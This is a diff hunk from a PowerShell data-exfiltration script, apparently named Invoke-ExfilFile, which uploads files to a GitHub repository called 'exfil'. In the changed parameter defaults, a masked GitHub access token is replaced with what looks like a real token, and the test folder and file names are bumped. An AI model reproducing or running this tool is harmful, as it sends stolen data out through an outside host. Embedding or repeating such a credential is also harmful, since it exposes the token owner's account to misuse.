@@ -57,15 +57,15 @@ Invoke-ExfilFile -GHUser nnh100 -GHRepo exfil -GHPAT "xxxxxxxxxxxxxxxxxxxxxxx" -
         [Parameter(Position = 2, Mandatory = $False)]
         [String]
         #$GHPAT = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
-        $GHPAT = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
+        $GHPAT = "6ad6248b0c3e98ba430a07a2379e49855b56e6c2",
 
         [Parameter(Position =3, Mandatory = $False)]
         [String]
-        $GHFilePath = "testfolder2/",
+        $GHFilePath = "testfolder5/",
 
         [Parameter(Position = 4, Mandatory = $False)]
         [String]
-        $GHFileName = "testfile1",
+        $GHFileName = "testfile5",
 
         [Parameter(Position = 5, Mandatory = $False)]
         [String]
